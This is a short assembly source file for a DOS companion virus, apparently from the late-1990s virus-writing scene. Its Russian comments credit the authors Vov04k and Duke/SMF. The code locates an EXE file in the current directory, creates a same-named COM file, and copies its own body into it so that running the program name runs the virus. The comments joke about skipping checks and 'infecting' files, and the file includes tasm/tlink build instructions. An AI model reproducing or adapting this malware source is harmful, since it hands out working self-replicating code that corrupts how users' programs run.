;Было  : C.43 by Vov04k@
;Стало : C.41 by Duke/SMF  (22.05.99)

;Если в текущем каталоге есть EXE-файл (первый, если их много),
;и у него нет одноименного COM, то поразим (создадим COM) и отвалим.
;Управления не возвращаем, ничерта не проверяем :)
;Мои комментарии отмечены "FD"
; tasm comp41.asm /m2
; tlink comp41.obj /t

.Model Tiny
.code
.386
org 100h
start:
E_Mask db '*.e*'
       mov  di,9eh
       xchg cx,ax              ;cx=0
       mov  ah,4eh
NewFile:
       mov dx,si
       int 21h
;       jnb TestFile           ;FD : а не плюнуть ли нам на проверку ???
;@Exit:                        ;FD : если файл есть - поразим !
;       ret                    ;FD : а на нет и суда нет ;-)

TestFile:
       mov dx,di
       mov ax,5b2eh
@1:
       scasb
       jne @1
       mov dword ptr [di],' moc'
@2:
       int 21h
       jc @Exit          ;уйдем на выход все равно повторного поиска нет
       xchg bx,ax
       mov ah,40h
       mov cl,MyLength
;@3:                           ;FD : это был мусор какой-то
       jmp short NewFile
@Exit:                         ;FD : самое место :)
       ret                     ;
;---
MyLength equ $-start
end start
